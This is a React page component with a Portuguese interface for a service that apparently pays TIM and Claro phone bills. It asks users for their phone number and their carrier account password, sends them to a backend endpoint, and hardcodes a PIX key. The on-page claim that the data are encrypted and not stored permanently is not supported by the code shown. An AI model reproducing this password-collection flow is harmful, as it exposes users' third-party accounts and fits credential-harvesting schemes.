import React, { useState, useContext } from 'react';
import { Link } from 'react-router-dom';
import { AuthContext } from '../App';
import { Button } from '../components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../components/ui/card';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../components/ui/select';
import { toast } from 'sonner';
import axios from 'axios';
import { Phone, ArrowLeft, CreditCard, Lock, Building, Clock, Copy, Upload, Calculator } from 'lucide-react';

const PayBillPage = () => {
  const { user, logout } = useContext(AuthContext);
  const [formData, setFormData] = useState({
    phoneNumber: '',
    operator: '',
    accountPassword: '',
    billAmount: ''
  });
  const [loading, setLoading] = useState(false);
  const [showPixModal, setShowPixModal] = useState(false);
  const [currentTransaction, setCurrentTransaction] = useState(null);
  const [timer, setTimer] = useState(0);
  const [uploadFile, setUploadFile] = useState(null);
  const [uploading, setUploading] = useState(false);
  
  const pixKey = "e0478dfb-0f3b-4837-977c-bc3a23622854";

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleOperatorChange = (value) => {
    setFormData({
      ...formData,
      operator: value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!formData.phoneNumber || !formData.operator || !formData.accountPassword) {
      toast.error('Preencha todos os campos');
      return;
    }
    
    setLoading(true);
    
    try {
      const response = await axios.post('/transactions/pay-bill', {
        phone_number: formData.phoneNumber,
        operator: formData.operator,
        account_password: formData.accountPassword
      });
      
      toast.success('Solicitação de pagamento de fatura criada! Nossa equipe entrará em contato em breve.');
      
      // Reset form
      setFormData({
        phoneNumber: '',
        operator: '',
        accountPassword: ''
      });
    } catch (error) {
      toast.error('Erro ao criar solicitação: ' + (error.response?.data?.detail || 'Erro desconhecido'));
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen p-4">
      {/* Header */}
      <div className="max-w-4xl mx-auto">
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center space-x-4">
            <Link to="/" className="flex items-center text-gray-300 hover:text-white transition-colors">
              <ArrowLeft className="w-5 h-5 mr-2" />
              Início
            </Link>
            <div className="w-10 h-10 rounded-xl bg-gradient-to-r from-green-500 to-teal-500 flex items-center justify-center">
              <CreditCard className="w-6 h-6 text-white" />
            </div>
            <h1 className="text-3xl font-bold gradient-text">Pagar Fatura</h1>
          </div>
          
          <div className="flex items-center space-x-4">
            <span className="text-gray-300">Olá, {user?.name}</span>
            <Button onClick={logout} variant="outline" className="text-white border-white/20 hover:bg-white/10">
              Sair
            </Button>
          </div>
        </div>

        {/* Main Content */}
        <div className="max-w-2xl mx-auto">
          {/* Info Card */}
          <Card className="glass-strong border-0 text-white mb-8">
            <CardHeader className="text-center">
              <CardTitle className="text-2xl gradient-text">Pagamento de Fatura</CardTitle>
              <CardDescription className="text-gray-300">
                Pague suas faturas TIM e Claro de forma rápida e segura
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                <h3 className="font-semibold text-blue-300 mb-2">ℹ️ Como funciona:</h3>
                <ul className="text-sm text-gray-300 space-y-1">
                  <li>• Preencha os dados da sua conta</li>
                  <li>• Nossa equipe verificará o valor da fatura</li>
                  <li>• Enviaremos o valor e instruç̃es de pagamento</li>
                  <li>• Após confirmação, processamos o pagamento</li>
                </ul>
              </div>
            </CardContent>
          </Card>

          {/* Payment Form */}
          <Card className="glass-strong border-0 text-white">
            <CardHeader>
              <CardTitle className="flex items-center space-x-2">
                <Building className="w-6 h-6 text-green-400" />
                <span>Dados para Pagamento</span>
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSubmit} className="space-y-6">
                {/* Phone Number */}
                <div className="space-y-2">
                  <Label htmlFor="phoneNumber" className="text-white flex items-center space-x-2">
                    <Phone className="w-4 h-4" />
                    <span>Número da Linha</span>
                  </Label>
                  <Input
                    id="phoneNumber"
                    name="phoneNumber"
                    type="tel"
                    value={formData.phoneNumber}
                    onChange={handleChange}
                    className="input-premium"
                    placeholder="(11) 99999-9999"
                    required
                    data-testid="bill-phone-input"
                  />
                </div>

                {/* Operator Selection */}
                <div className="space-y-2">
                  <Label className="text-white flex items-center space-x-2">
                    <Building className="w-4 h-4" />
                    <span>Operadora</span>
                  </Label>
                  <Select value={formData.operator} onValueChange={handleOperatorChange}>
                    <SelectTrigger className="input-premium" data-testid="bill-operator-select">
                      <SelectValue placeholder="Selecione a operadora" />
                    </SelectTrigger>
                    <SelectContent className="bg-gray-800 border-gray-700">
                      <SelectItem value="tim" className="text-white hover:bg-gray-700">
                        TIM
                      </SelectItem>
                      <SelectItem value="claro" className="text-white hover:bg-gray-700">
                        Claro
                      </SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                {/* Account Password */}
                <div className="space-y-2">
                  <Label htmlFor="accountPassword" className="text-white flex items-center space-x-2">
                    <Lock className="w-4 h-4" />
                    <span>Senha da Conta da Operadora</span>
                  </Label>
                  <Input
                    id="accountPassword"
                    name="accountPassword"
                    type="password"
                    value={formData.accountPassword}
                    onChange={handleChange}
                    className="input-premium"
                    placeholder="Senha da sua conta na operadora"
                    required
                    data-testid="bill-password-input"
                  />
                  <p className="text-xs text-gray-400">
                    Esta é a senha que você usa para acessar a área do cliente da operadora
                  </p>
                </div>

                {/* Submit Button */}
                <Button 
                  type="submit"
                  disabled={loading}
                  className="w-full btn-success text-lg py-3 mt-8"
                  data-testid="bill-submit-button"
                >
                  {loading ? (
                    <div className="flex items-center space-x-2">
                      <div className="spinner w-5 h-5"></div>
                      <span>Processando...</span>
                    </div>
                  ) : (
                    <div className="flex items-center space-x-2">
                      <CreditCard className="w-5 h-5" />
                      <span>Solicitar Pagamento</span>
                    </div>
                  )}
                </Button>
              </form>
              
              {/* Security Notice */}
              <div className="mt-6 p-4 bg-green-500/10 border border-green-500/20 rounded-lg">
                <div className="flex items-center space-x-2 text-green-300 mb-2">
                  <Lock className="w-5 h-5" />
                  <span className="font-semibold">🔒 Segurança</span>
                </div>
                <p className="text-sm text-gray-300">
                  Seus dados são criptografados e utilizados apenas para o pagamento da fatura. 
                  Não armazenamos informações sensíveis permanentemente.
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default PayBillPage;